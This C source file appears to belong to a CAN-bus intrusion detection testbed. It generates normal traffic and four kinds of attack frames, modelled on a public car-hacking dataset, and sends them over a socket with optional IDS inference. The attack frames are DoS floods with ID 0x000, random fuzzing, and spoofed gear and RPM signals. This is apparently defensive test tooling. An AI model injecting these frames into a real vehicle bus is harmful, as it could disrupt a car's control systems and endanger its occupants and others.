#include "attack_generator.h"
#include "ids_runtime.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static uint8_t clamp_u8(unsigned int v) {
    return (uint8_t)(v > 255U ? 255U : v);
}

void fill_synthetic_normal_frame(struct can_frame *frame, uint64_t seq) {
    static const canid_t normal_ids[] = {
        0x043, 0x164, 0x201, 0x260, 0x2A0, 0x316, 0x329, 0x43F
    };
    const size_t n_ids = sizeof(normal_ids) / sizeof(normal_ids[0]);

    memset(frame, 0, sizeof(*frame));
    frame->can_id = normal_ids[seq % n_ids];
    frame->can_dlc = 8;

    for (int i = 0; i < 8; ++i) {
        frame->data[i] = (uint8_t)((seq * 13U + (unsigned int)i * 17U + frame->can_id) & 0xFFU);
    }
}

void fill_attack_frame(struct can_frame *frame, attack_type_t attack_type, uint64_t seq) {
    memset(frame, 0, sizeof(*frame));
    frame->can_dlc = 8;

    switch (attack_type) {
        case ATTACK_DOS:
            /* Car Hacking Dataset DoS style often injects dominant ID 0x000 rapidly. */
            frame->can_id = 0x000;
            memset(frame->data, 0x00, 8);
            break;

        case ATTACK_FUZZY:
            frame->can_id = (canid_t)(rand() & CAN_SFF_MASK);
            for (int i = 0; i < 8; ++i) {
                frame->data[i] = (uint8_t)(rand() & 0xFF);
            }
            break;

        case ATTACK_GEAR:
            /* Spoof gear-related ID. Dataset-specific IDs may vary by vehicle. */
            frame->can_id = 0x043;
            memset(frame->data, 0x00, 8);
            frame->data[0] = (uint8_t)(seq % 6U);       /* fake gear state */
            frame->data[1] = 0xFF;
            frame->data[2] = 0x00;
            break;

        case ATTACK_RPM: {
            /* Spoof RPM-like signal on common ID. Dataset-specific scaling may vary. */
            frame->can_id = 0x316;
            memset(frame->data, 0x00, 8);
            unsigned int rpm = 7000U + (unsigned int)((seq % 20U) * 100U);
            frame->data[2] = clamp_u8((rpm >> 8) & 0xFFU);
            frame->data[3] = clamp_u8(rpm & 0xFFU);
            frame->data[4] = 0xFF;
            break;
        }

        case ATTACK_NONE:
        default:
            fill_synthetic_normal_frame(frame, seq);
            break;
    }
}

static int run_generator(int sock, const app_config_t *cfg, app_stats_t *stats, bool attack) {
    uint64_t start = now_us();
    uint64_t end = cfg->duration_sec > 0 ? start + (uint64_t)cfg->duration_sec * 1000000ULL : 0;
    uint64_t seq = 0;
    uint64_t next_send = start;
    uint64_t interval_us = cfg->rate_fps > 0 ? 1000000ULL / cfg->rate_fps : 0;
    ids_runtime_t ids;
    if (cfg->infer_sent) {
        ids_runtime_init(&ids, cfg->ids_window);
    }
    if (cfg->rate_fps > 0 && interval_us == 0) {
        interval_us = 1;
    }

    while (cfg->duration_sec == 0 || now_us() < end) {
        struct can_frame frame;
        if (attack) {
            fill_attack_frame(&frame, cfg->attack_type, seq);
        } else {
            fill_synthetic_normal_frame(&frame, seq);
        }

        if (send_can_frame(sock, &frame) == 0) {
            stats->frames_sent++;
            if (cfg->infer_sent) {
                int pred = -1;
                if (ids_runtime_on_frame(&ids, &frame, now_us(), &pred) && pred == 1) {
                    printf("[IDS] ATTACK on sent frame=%llu can_id=0x%03X\n",
                           (unsigned long long)stats->frames_sent, frame.can_id & CAN_SFF_MASK);
                }
            }
        } else {
            stats->frames_failed++;
        }

        seq++;
        if (cfg->rate_fps > 0) {
            next_send += interval_us;
            sleep_until_us(next_send);
        }
    }

    stats->elapsed_sec = (double)(now_us() - start) / 1000000.0;
    if (cfg->infer_sent) {
        printf("IDS predictions=%u attacks=%u window=%u\n", ids.predictions, ids.attacks_detected, ids.window_size);
    }
    return 0;
}

int run_synthetic_mode(int sock, const app_config_t *cfg, app_stats_t *stats) {
    return run_generator(sock, cfg, stats, false);
}

int run_attack_mode(int sock, const app_config_t *cfg, app_stats_t *stats) {
    return run_generator(sock, cfg, stats, true);
}
